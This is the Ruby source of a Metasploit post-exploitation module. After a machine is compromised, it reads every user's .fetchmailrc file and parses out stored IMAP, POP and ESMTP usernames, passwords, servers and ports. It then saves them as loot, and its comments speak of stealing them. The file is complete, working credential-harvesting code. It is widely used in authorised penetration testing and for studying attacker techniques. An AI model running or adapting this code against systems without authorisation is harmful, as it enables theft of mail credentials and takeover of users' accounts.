##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UNIX Gather .fetchmailrc Credentials',
        'Description' => %q{
          Post Module to obtain credentials saved for IMAP, POP and other mail
          retrieval protocols in fetchmail's .fetchmailrc
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Jon Hart <jhart[at]spoofed.org>' ],
        'Platform' => %w[bsd linux osx unix],
        'SessionTypes' => [ 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    # A table to store the found credentials.
    cred_table = Rex::Text::Table.new(
      'Header' => '.fetchmailrc credentials',
      'Indent' => 1,
      'Columns' =>
      [
        'Username',
        'Password',
        'Server',
        'Protocol',
        'Port'
      ]
    )

    # walk through each user directory
    enum_user_directories.each do |user_dir|
      fetchmailrc_file = ::File.join(user_dir, '.fetchmailrc')
      unless readable? fetchmailrc_file
        vprint_error("Couldn't read #{fetchmailrc_file}")
        next
      end
      print_status("Reading: #{fetchmailrc_file}")
      # read their .fetchmailrc if it exists
      lines = read_file(fetchmailrc_file).each_line.to_a
      next if (lines.size <= 0)

      print_status("Parsing #{fetchmailrc_file}")

      # delete any comments
      lines.delete_if { |l| l =~ /^#/ }
      # trim any leading/trailing whitespace
      lines.map(&:strip!)
      # turn any multi-line config options into a single line to ease parsing
      (lines.size - 1).downto(0) do |i|
        # if the line we are reading doesn't signify a new configuration section...
        next if ((lines[i] =~ /^(?:defaults|poll|skip)\s+/))

        # append the current line to the previous
        lines[i - 1] << ' '
        lines[i - 1] << lines[i]
        # and axe the current line
        lines.delete_at(i)
      end

      # any default options found, used as defaults for poll or skip lines
      # that are missing options and want to use defaults
      defaults = {}

      # now parse each line found
      lines.each do |line|
        # if there is a 'default' line, save any of these options as
        # they should be used when subsequent poll/skip lines are missing them.
        if (line =~ /^defaults/)
          defaults = parse_fetchmailrc_line(line).first
          next
        end

        # now merge the currently parsed line with whatever defaults may have
        # been found, then save if there is enough to save
        parse_fetchmailrc_line(line).each do |cred|
          cred = defaults.merge(cred)
          if cred[:host] && cred[:protocol]
            if (cred[:users].size == cred[:passwords].size)
              cred[:users].each_index do |i|
                cred_table << [ cred[:users][i], cred[:passwords][i], cred[:host], cred[:protocol], cred[:port] ]
              end
            else
              print_error("Skipping '#{line}' -- number of users and passwords not equal")
            end
          end
        end
      end
    end

    if cred_table.rows.empty?
      print_status('No creds collected')
    else
      print_line("\n" + cred_table.to_s)

      # store all found credentials
      p = store_loot(
        'fetchmailrc.creds',
        'text/csv',
        session,
        cred_table.to_csv,
        'fetchmailrc_credentials.txt',
        '.fetchmailrc credentials'
      )

      print_status("Credentials stored in: #{p}")
    end
  end

  # Parse a line +line+, assumed to be from a fetchmail configuration file,
  # returning an array of all credentials found on that line
  def parse_fetchmailrc_line(line)
    creds = []
    cred = {}
    # parse and clean any users
    users = fetchmailrc_values(line, /user(?:name)?/)
    cred[:users] = users unless users.empty?
    # parse and clean any passwords
    passwords = fetchmailrc_values(line, /pass(?:word)?/)
    cred[:passwords] = passwords unless passwords.empty?
    # parse any hosts, ports and protocols
    cred[:protocol] = ::Regexp.last_match(1) if (line =~ /\s+proto(?:col)?\s+(\S+)/)
    cred[:port] = ::Regexp.last_match(1) if (line =~ /\s+(?:port|service)\s+(\S+)/)
    cred[:host] = ::Regexp.last_match(1) if (line =~ /^(?:poll|skip)\s+(\S+)/)
    # a 'via' option overrides poll/skip
    cred[:host] = ::Regexp.last_match(1) if (line =~ /\s+via\s+(\S+)/)
    # save this credential
    creds << cred
    # fetchmail can also "forward" mail by pulling it down with POP/IMAP and then
    # connecting to some SMTP server and sending it.  If ESMTP AUTH (RFC 2554) credentials
    # are specified, steal those too.
    cred = {}
    esmtp_user = fetchmailrc_values(line, /esmtpname/).first
    esmtp_password = fetchmailrc_values(line, /esmtppassword/).first
    cred[:users] = [esmtp_user] if esmtp_user
    cred[:passwords] = [esmtp_password] if esmtp_password
    # XXX: what is the best way to get the host we are currently looting?  localhost is lame.
    cred[:host] = (line =~ /\s+smtphost\s+(\S+)/ ? ::Regexp.last_match(1) : 'localhost')
    cred[:protocol] = 'esmtp'
    # save the ESMTP credentials if we've found enough
    creds << cred if cred[:users] && cred[:passwords] && cred[:host]
    # return all found credentials
    creds
  end

  def fetchmailrc_values(line, keyword)
    quoted_string = /"[^"]*"|'[^']*'/
    # Skip standalone quoted strings so their contents cannot become options.
    # https://www.fetchmail.info/fetchmail-man.html#run-control-syntax
    line.scan(/#{quoted_string}|\s+#{keyword}\s+(#{quoted_string}|\S+)/).flatten.compact.map do |value|
      if value.start_with?('"', "'") && value.end_with?(value[0])
        value[1...-1]
      else
        value
      end
    end
  end
end
